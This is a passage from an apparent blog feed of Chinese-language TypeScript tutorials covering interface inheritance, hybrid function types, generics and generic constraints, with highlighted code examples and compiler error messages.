class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上例中，<code>Car</code> 实现了 <code>Alarm</code> 和 <code>Light</code> 接口，既能报警，也能开关车灯。</p><h2 id="接口继承接口"><a href="#接口继承接口" class="headerlink" title="接口继承接口"></a>接口继承接口</h2><p>接口与接口之间可以是继承关系：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">Alarm</span> <span class="token punctuation">{</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">LightableAlarm</span> <span class="token keyword">extends</span> <span class="token class-name">Alarm</span> <span class="token punctuation">{</span>    <span class="token function">lightOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">lightOff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上例中，我们使用 <code>extends</code> 使 <code>LightableAlarm</code> 继承 <code>Alarm</code>。</p><h2 id="接口继承类"><a href="#接口继承类" class="headerlink" title="接口继承类"></a>接口继承类</h2><p>接口也可以继承类：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Point</span> <span class="token punctuation">{</span>    x<span class="token punctuation">:</span> number<span class="token punctuation">;</span>    y<span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">Point3d</span> <span class="token keyword">extends</span> <span class="token class-name">Point</span> <span class="token punctuation">{</span>    z<span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> point3d<span class="token punctuation">:</span> Point3d <span class="token operator">=</span> <span class="token punctuation">{</span>x<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> z<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="混合类型"><a href="#混合类型" class="headerlink" title="混合类型"></a>混合类型</h2><p>可以使用接口的方式来定义一个函数需要符合的形状：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">SearchFunc</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span>source<span class="token punctuation">:</span> string<span class="token punctuation">,</span> subString<span class="token punctuation">:</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span> boolean<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> mySearch<span class="token punctuation">:</span> SearchFunc<span class="token punctuation">;</span>mySearch <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>source<span class="token punctuation">:</span> string<span class="token punctuation">,</span> subString<span class="token punctuation">:</span> string<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> source<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span>subString<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有时候，一个函数还可以有自己的属性和方法：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">Counter</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span>start<span class="token punctuation">:</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>    interval<span class="token punctuation">:</span> number<span class="token punctuation">;</span>    <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> Counter <span class="token punctuation">{</span>    <span class="token keyword">let</span> counter <span class="token operator">=</span> <span class="token operator">&lt;</span>Counter<span class="token operator">></span><span class="token keyword">function</span> <span class="token punctuation">(</span>start<span class="token punctuation">:</span> number<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    counter<span class="token punctuation">.</span>interval <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    counter<span class="token punctuation">.</span>reset <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> counter<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> c <span class="token operator">=</span> <span class="token function">getCounter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">c</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token punctuation">.</span>interval <span class="token operator">=</span> <span class="token number">5.0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript泛型约束(二)</title>
      <link href="2019/07/02/Generics2/"/>
      <url>2019/07/02/Generics2/</url>
      
        <content type="html"><![CDATA[<h2 id="泛型约束"><a href="#泛型约束" class="headerlink" title="泛型约束"></a>泛型约束</h2><p>有了泛型之后，一个函数或容器类能处理的类型一下子扩到了无限大，似乎有点失控的感觉。所以这里又产生了一个约束的概念。我们可以声明对类型参数进行约束。</p><p>我们还拿上文中的student栗子来说，想访问value的length属性，但是编译器并不能证明每种类型都有length属性，所以就报错了。</p><pre class="line-numbers language-js"><code class="language-js">student <span class="token operator">=</span> <span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">(</span>value<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> T <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Property 'length' does not exist on type 'T'.ts(2339)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相比于操作<code>any</code>所有类型，我们想要限制函数去处理任意带有<code>.length</code>属性的所有类型。 只要传入的类型有这个属性，我们就允许，就是说至少包含这一属性。 为此，我们需要列出对于T的约束要求。为此，我们定义一个接口来描述约束条件。 创建一个包含 <code>.length</code>属性的接口，使用这个接口和<code>extends</code>关键字来实现约束：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">LengthDefine</span> <span class="token punctuation">{</span>    length<span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//这样函数定义是编译器就不会报错了</span>student <span class="token operator">=</span> <span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">LengthDefine</span><span class="token operator">></span><span class="token punctuation">(</span>value<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> T <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用：</p><p>传入的是字符串能，里面含有length属性，能正常运行</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> name<span class="token punctuation">:</span> string <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果传入的是number类型的数字：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> age <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Argument of type '10' is not assignable to parameter of type 'LengthDefine'.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们需要传入符合约束类型的值，必须包含必须的属性：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> name<span class="token punctuation">:</span> string <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> age <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student</span><span class="token punctuation">(</span><span class="token punctuation">{</span>length<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> value<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>age的类型推导结果：<span class="token punctuation">(</span>property<span class="token punctuation">)</span> Init<span class="token punctuation">.</span>student<span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token punctuation">{</span>    length<span class="token punctuation">:</span> number<span class="token punctuation">;</span>    value<span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">(</span>value<span class="token punctuation">:</span> <span class="token punctuation">{</span>    length<span class="token punctuation">:</span> number<span class="token punctuation">;</span>    value<span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    length<span class="token punctuation">:</span> number<span class="token punctuation">;</span>    value<span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="约束为类型参数"><a href="#约束为类型参数" class="headerlink" title="约束为类型参数"></a>约束为类型参数</h2><p>我们可以声明一个类型参数，且它被另一个类型参数所约束。 比如，现在我们想要用属性名从对象里获取这个属性。 并且我们想要确保这个属性存在于对象 obj上，因此我们需要在这两个类型之间使用约束。</p><pre class="line-numbers language-js"><code class="language-js">getProperty <span class="token operator">=</span> <span class="token operator">&lt;</span>T<span class="token punctuation">,</span> K <span class="token keyword">extends</span> <span class="token class-name">keyof</span> T<span class="token operator">></span><span class="token punctuation">(</span>obj<span class="token punctuation">:</span> T<span class="token punctuation">,</span> key<span class="token punctuation">:</span> K<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> c<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Argument of type '"d"' is not assignable to parameter of type '"a" | "b" | "c"'.ts(2345)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="约束为类类型"><a href="#约束为类类型" class="headerlink" title="约束为类类型"></a>约束为类类型</h2><p>在TypeScript使用泛型创建工厂函数时，需要引用构造函数的类类型。比如：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> create<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">(</span>c<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> T<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">:</span> T <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用原型属性推断并约束构造函数与类实例的关系</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Keeper1</span> <span class="token punctuation">{</span>    hasMask<span class="token punctuation">:</span> boolean<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Keeper2</span> <span class="token punctuation">{</span>    nameTag<span class="token punctuation">:</span> string<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Keeper3</span> <span class="token punctuation">{</span>    numLength<span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">ChildrenKeeper1</span> <span class="token keyword">extends</span> <span class="token class-name">Keeper3</span> <span class="token punctuation">{</span>    keeper<span class="token punctuation">:</span> Keeper1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">ChildrenKeeper2</span> <span class="token keyword">extends</span> <span class="token class-name">Keeper3</span> <span class="token punctuation">{</span>    keeper<span class="token punctuation">:</span> Keeper2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> createInstance<span class="token operator">&lt;</span>A <span class="token keyword">extends</span> <span class="token class-name">Keeper3</span><span class="token operator">></span> <span class="token punctuation">(</span>c<span class="token punctuation">:</span> <span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> A<span class="token punctuation">)</span><span class="token punctuation">:</span> A <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">createInstance</span><span class="token punctuation">(</span>ChildrenKeeper1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ChildrenKeeper1 {}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">createInstance</span><span class="token punctuation">(</span>ChildrenKeeper2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ChildrenKeeper2 {}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript泛型详解(一)</title>
      <link href="2019/06/18/Generics1/"/>
      <url>2019/06/18/Generics1/</url>
      
        <content type="html"><![CDATA[<h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><p>泛型（Generics）是指在定义函数、接口或类的时候，不预先指定具体的类型，而在使用的时候再指定类型的一种特性。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>我们先实现一个student方法获取不同属性来看看使用：</p><h2 id="JavaScript实现"><a href="#JavaScript实现" class="headerlink" title="JavaScript实现"></a>JavaScript实现</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//定义学生的属性获取方法，一个返回字符串类型的name一个返回number类型的年龄</span><span class="token keyword">let</span> itemFun <span class="token operator">=</span> <span class="token punctuation">{</span>    getName<span class="token punctuation">:</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token operator">||</span><span class="token string">"Tom"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    getAge<span class="token punctuation">:</span> <span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token operator">||</span><span class="token number">20</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义student学生实例中间方法，直接返回处理后的数据</span>student <span class="token operator">=</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//对于JavaScript来说并不关心返回类型，以上使用完全没有问题</span><span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token function">student</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> age <span class="token operator">=</span> <span class="token function">student</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="TypeScript实现"><a href="#TypeScript实现" class="headerlink" title="TypeScript实现"></a>TypeScript实现</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//定义学生的属性获取方法，一个返回字符串类型的name一个返回number类型的年龄</span><span class="token keyword">let</span> itemFun <span class="token operator">=</span> <span class="token punctuation">{</span>    getName<span class="token punctuation">:</span> <span class="token punctuation">(</span>name<span class="token punctuation">:</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    getAge<span class="token punctuation">:</span> <span class="token punctuation">(</span>age<span class="token punctuation">:</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span>number<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果我们还是和以上方式一样去定义公共处理方式和调用就会出现以下问题：</p><pre class="line-numbers language-js"><code class="language-js">student <span class="token operator">=</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> name<span class="token punctuation">:</span> string <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> age<span class="token punctuation">:</span> number <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们写方法是没有添加任何类型校验，那么TypeScript就通过类型推断把student定义成了如下形式：</p><pre class="line-numbers language-js"><code class="language-js">student <span class="token operator">=</span> <span class="token punctuation">(</span>value<span class="token punctuation">:</span> any<span class="token punctuation">)</span><span class="token punctuation">:</span>any <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样就失去了本身TypeScript中类型校验的意义了，在开发中我们能不使用any就尽量不要使用。</p><p>那么我们如何定义才能实现既能返回<code>string</code> 又能返回 <code>number</code>呢</p><h4 id="方案一、使用多个中间方法"><a href="#方案一、使用多个中间方法" class="headerlink" title="方案一、使用多个中间方法"></a>方案一、使用多个中间方法</h4><pre class="line-numbers language-js"><code class="language-js">student1 <span class="token operator">=</span> <span class="token punctuation">(</span>value<span class="token punctuation">:</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span>student2 <span class="token operator">=</span> <span class="token punctuation">(</span>value<span class="token punctuation">:</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span> number <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> name<span class="token punctuation">:</span> string <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student1</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> age<span class="token punctuation">:</span> number <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student2</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样最大的问题就是失去了本身封装的便捷性，有多个属性方法时需要多个中间处理，基本不可取</p><h4 id="方案二、使用泛型"><a href="#方案二、使用泛型" class="headerlink" title="方案二、使用泛型"></a>方案二、使用泛型</h4><p>泛型就是指定一个表示类型的变量，用它来代替某个实际的类型用于编程，而后通过实际调用时传入或推导的类型来对其进行替换，以达到一段使用泛型程序可以实际适应不同类型的目的。</p><h3 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h3><pre class="line-numbers language-js"><code class="language-js">这样写的话tsx会直接编译报错student2 <span class="token operator">=</span> <span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>value<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> T <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//JSX element 'T' has no corresponding closing tag.ts(17008)</span><span class="token comment" spellcheck="true">//Expression expected.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Intellisense gets very upset and complains, because it is trying to make the <t> into a React JSX element. But my intention is to have the compiler treat it as a generic type designator.</t></p><p>Intellisense非常沮丧和抱怨，因为它试图将<t>变成React JSX元素。 但我的目的是让编译器将其视为通用类型指示符。</t></p><p>那我们如果依然想使用箭头函数改如何处理呢？</p><p>When you have a single type parameter, TypeScript isn’t sure whether it might be a JSX opening tag or not. It has to choose one, so it goes with JSX.</p><p>当您有一个类型参数时，TypeScript不确定它是否可能是JSX开始标记。 它必须选择一个，所以它与JSX一起使用。</p><p>If you want a function with the exact same semantics, you can explicitly list the constraint of <code>T</code>:</p><p>如果你想要一个具有完全相同语义的函数，你可以明确列出T的约束：</p><pre class="line-numbers language-js"><code class="language-js">student <span class="token operator">=</span> <span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">(</span>value<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> T <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> name<span class="token punctuation">:</span> string <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> age<span class="token punctuation">:</span> number <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Jack 18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This breaks the ambiguity for TypeScript so that you can use a generic type parameter. It also has the same semantics because type parameters always have an implicit constraint of {}.</p><p>这打破了TypeScript的歧义，以便您可以使用泛型类型参数。 它也具有相同的语义，因为类型参数始终具有{}的隐式约束。</p><h3 id="普通函数"><a href="#普通函数" class="headerlink" title="普通函数"></a>普通函数</h3><pre class="line-numbers language-js"><code class="language-js">student<span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>value<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> T <span class="token punctuation">{</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> name<span class="token punctuation">:</span> string <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> age<span class="token punctuation">:</span> number <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">student</span><span class="token punctuation">(</span>itemFun<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Jack 18</span><span aria-hidden="true" 